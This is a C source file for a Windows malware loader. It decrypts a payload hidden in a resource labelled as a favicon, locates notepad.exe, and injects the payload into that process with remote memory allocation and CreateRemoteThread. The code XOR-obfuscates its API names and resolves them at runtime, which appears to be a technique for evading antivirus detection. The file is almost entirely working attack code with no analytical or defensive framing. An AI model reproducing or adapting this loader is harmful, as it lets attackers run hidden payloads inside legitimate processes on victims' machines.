#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"

LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

LPVOID (WINAPI * pVirtualAlloc)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
  DWORD dwFlags,
  DWORD th32ProcessID
);

BOOL (WINAPI * pProcess32First)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pProcess32Next)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

HRSRC (WINAPI * pFindResourceA)(
  HMODULE hModule,
  LPCSTR  lpName,
  LPCSTR  lpType
);

HGLOBAL (WINAPI * pLoadResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

LPVOID (WINAPI * pLockResource)(
  HGLOBAL hResData
);

DWORD (WINAPI * pSizeofResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

VOID (WINAPI * pRtlMoveMemory)(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T Length
);

BOOL (WINAPI * pCloseHandle)(
  HANDLE hObject
);

DWORD (WINAPI * pWaitForSingleObject)(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);

HANDLE (WINAPI * pOpenProcess)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

char k2[] = "privatekeyforxorencryptionfunction";

//// XORED FUNCTIONS
unsigned char sVirtualAllocEx[] = { 0x26, 0x1b, 0x1b, 0x2, 0x14, 0x15, 0x9, 0x2a, 0x9, 0x15, 0x9, 0xc, 0x37, 0x0 };
unsigned char sWriteProcessMemory[] = { 0x27, 0x0, 0x0, 0x2, 0x4, 0x24, 0x17, 0x4, 0x6, 0x1c, 0x15, 0x1c, 0x3f, 0x1d, 0x2, 0x1d, 0x17, 0x17 };
unsigned char sCreateRemoteThread[] = { 0x33, 0x0, 0xc, 0x17, 0x15, 0x11, 0x37, 0xe, 0x8, 0x16, 0x12, 0xa, 0x26, 0x10, 0x1d, 0x17, 0x4, 0xa };
unsigned char sOpenProcess[] = { 0x3f, 0x2, 0xc, 0x18, 0x31, 0x6, 0xa, 0x8, 0x0, 0xa, 0x15 };
unsigned char sFindResourceA[] = { 0x36, 0x1b, 0x7, 0x12, 0x33, 0x11, 0x16, 0x4, 0x10, 0xb, 0x5, 0xa, 0x33 };
unsigned char sLoadResource[] = { 0x3c, 0x1d, 0x8, 0x12, 0x33, 0x11, 0x16, 0x4, 0x10, 0xb, 0x5, 0xa };
unsigned char sLockResource[] = { 0x3c, 0x1d, 0xa, 0x1d, 0x33, 0x11, 0x16, 0x4, 0x10, 0xb, 0x5, 0xa };
unsigned char sSizeofResource[] = { 0x23, 0x1b, 0x13, 0x13, 0xe, 0x12, 0x37, 0xe, 0x16, 0x16, 0x13, 0x1d, 0x11, 0x1d };
unsigned char sVirtualAlloc[] = { 0x26, 0x1b, 0x1b, 0x2, 0x14, 0x15, 0x9, 0x2a, 0x9, 0x15, 0x9, 0xc };
unsigned char sRtlMoveMemory[] = { 0x22, 0x6, 0x5, 0x3b, 0xe, 0x2, 0x0, 0x26, 0x0, 0x14, 0x9, 0x1d, 0xb };
unsigned char sWaitForSingleObject[] = { 0x27, 0x13, 0x0, 0x2, 0x27, 0x1b, 0x17, 0x38, 0xc, 0x17, 0x1, 0x3, 0x17, 0x37, 0xd, 0x18, 0x0, 0xd, 0x17 };
unsigned char sCloseHandle[] = { 0x33, 0x1e, 0x6, 0x5, 0x4, 0x3c, 0x4, 0x5, 0x1, 0x15, 0x3 };
//unsigned char sCreateToolhelp32Snapshot[] =  { 0x3, 0x31, 0x1b, 0x13, 0x0, 0x0, 0x0, 0x3f, 0xa, 0x16, 0xa, 0x7, 0x17, 0x14, 0x1f, 0x41, 0x57, 0x3d, 0xd, 0x13, 0x9, 0x3, 0x1c, 0x6, 0x1b }; // THIS ONE DOESN'T WORK?
unsigned char sProcess32First[] = { 0x20, 0x0, 0x6, 0x15, 0x4, 0x7, 0x16, 0x58, 0x57, 0x3f, 0xf, 0x1d, 0x1, 0xc };
unsigned char sProcess32Next[] = { 0x20, 0x0, 0x6, 0x15, 0x4, 0x7, 0x16, 0x58, 0x57, 0x37, 0x3, 0x17, 0x6 };

//// XORED STRINGS
unsigned char sKdll[] = { 0x1b, 0x17, 0x1b, 0x18, 0x4, 0x18, 0x56, 0x59, 0x4b, 0x1d, 0xa, 0x3 }; //kernel32.dll
unsigned char sNdll[] = { 0x3e, 0x6, 0xd, 0x1a, 0xd, 0x5a, 0x1, 0x7, 0x9 }; //Ntdll.dll
unsigned char sPrNa[] = { 0x3e, 0x1d, 0x1d, 0x13, 0x11, 0x15, 0x1, 0x45, 0x0, 0x1, 0x3 }; //Notepad.exe

void XOR(char * data, int data_len, char * k, int k_len) {
	int y;
	
	y = 0;
	for (int i = 0; i < data_len; i++) {
		if (y == k_len - 1) y = 0;

		data[i] = data[i] ^ k[y];
		y++;
	}
}

int GePr(const char *pname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
		
		//XOR((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), k2, sizeof(k2)); // THIS ONE DOESN'T WORK?
		XOR((char *) sProcess32First, sizeof(sProcess32First), k2, sizeof(k2));
		XOR((char *) sProcess32Next, sizeof(sProcess32Next), k2, sizeof(k2));
		XOR((char *) sCloseHandle, sizeof(sCloseHandle), k2, sizeof(k2));
		
		//pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(sKdll), sCreateToolhelp32Snapshot); // THIS ONE DOESN'T WORK?
		pProcess32First = GetProcAddress(GetModuleHandle(sKdll), sProcess32First);
		pProcess32Next = GetProcAddress(GetModuleHandle(sKdll), sProcess32Next);
		pCloseHandle = GetProcAddress(GetModuleHandle(sKdll), sCloseHandle);
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // THIS ONE DOESN'T WORK?
		
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(pname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int Inj(HANDLE hProc, unsigned char * payl, unsigned int payl_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
		
		XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), k2, sizeof(k2));
		XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), k2, sizeof(k2));
		XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), k2, sizeof(k2));
		XOR((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), k2, sizeof(k2));
		XOR((char *) sCloseHandle, sizeof(sCloseHandle), k2, sizeof(k2));

		pVirtualAllocEx = GetProcAddress(GetModuleHandle(sKdll), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle(sKdll), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle(sKdll), sCreateRemoteThread);
		pWaitForSingleObject = GetProcAddress(GetModuleHandle(sKdll), sWaitForSingleObject);
		pCloseHandle = GetProcAddress(GetModuleHandle(sKdll), sCloseHandle);
  
        pRemoteCode = pVirtualAllocEx(hProc, NULL, payl_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payl, (SIZE_T)payl_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
    
	void * emem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payl;
	unsigned int payl_len;
	
	int pid = 0;
    HANDLE hProc = NULL;
	
	XOR((char *) sFindResourceA, sizeof(sFindResourceA), k2, sizeof(k2));
	XOR((char *) sLoadResource, sizeof(sLoadResource), k2, sizeof(k2));
	XOR((char *) sLockResource, sizeof(sLockResource), k2, sizeof(k2));
	XOR((char *) sSizeofResource, sizeof(sSizeofResource), k2, sizeof(k2));
	XOR((char *) sVirtualAlloc, sizeof(sVirtualAlloc), k2, sizeof(k2));
	XOR((char *) sOpenProcess, sizeof(sOpenProcess), k2, sizeof(k2));
	XOR((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), k2, sizeof(k2));
	
	XOR((char *) sKdll, sizeof(sKdll), k2, sizeof(k2));
	XOR((char *) sNdll, sizeof(sNdll), k2, sizeof(k2));
	XOR((char *) sPrNa, sizeof(sPrNa), k2, sizeof(k2));
	
	pFindResourceA = GetProcAddress(GetModuleHandle(sKdll), sFindResourceA);
	pLoadResource = GetProcAddress(GetModuleHandle(sKdll), sLoadResource);
	pLockResource = GetProcAddress(GetModuleHandle(sKdll), sLockResource);
	pSizeofResource = GetProcAddress(GetModuleHandle(sKdll), sSizeofResource);
	pVirtualAlloc = GetProcAddress(GetModuleHandle(sKdll), sVirtualAlloc);
	pOpenProcess = GetProcAddress(GetModuleHandle(sKdll), sOpenProcess);
	pRtlMoveMemory = GetProcAddress(GetModuleHandle(sNdll), sRtlMoveMemory);
	
	// Extract payload from resources section
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payl = (char *) pLockResource(resHandle);
	payl_len = pSizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	emem = pVirtualAlloc(0, payl_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to new memory buffer
	pRtlMoveMemory(emem, payl, payl_len);
	
	// Decrypt (DeXOR) the payload
	XOR((char *) emem, payl_len, k2, sizeof(k2));
	
	// Inject process starts here...
	pid = GePr(sPrNa);
	
	if (pid) {
		
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inj(hProc, emem, payl_len);
			CloseHandle(hProc);
		}
	}

	return 0;
}